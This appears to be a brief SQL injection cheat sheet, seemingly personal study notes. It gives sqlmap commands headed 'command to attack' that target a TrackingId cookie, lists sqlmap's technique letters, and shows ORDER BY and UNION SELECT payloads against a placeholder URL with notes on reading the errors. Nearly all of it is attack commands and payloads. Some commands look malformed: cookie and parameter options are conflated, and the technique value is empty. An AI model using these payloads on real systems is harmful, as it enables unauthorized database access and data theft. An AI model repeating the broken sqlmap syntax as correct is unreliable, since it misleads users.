# sqlmap command to attack 

---
`sqlmap -u "url" -p cookies="TrackingId=*" --technique=`

`sqlmap -r req.txt -p cookies="TrackingId=*" --technique=`
--- 

The list of techniques with its letters is as follows:

    B: Boolean-based blind
    E: Error-based
    U: Union query-based
    S: Stacked queries
    T: Time-based blind
    Q: Inline queries


# sql injection payload for error based technique

---
http://domain.com/index.php?id=1' order by 1-- -
---

1. This query musn't shows up error, since there is no lower number than 1
2. order by 1: mean arrage the result in asscending order by the first column of the table

---
http://domain.com/index.php?id=xyz' UNION SELECT 1--
---

1. return **ERROR: UNION types character varying and integer cannot be matched** mean id's type is character while 1 is type of integer
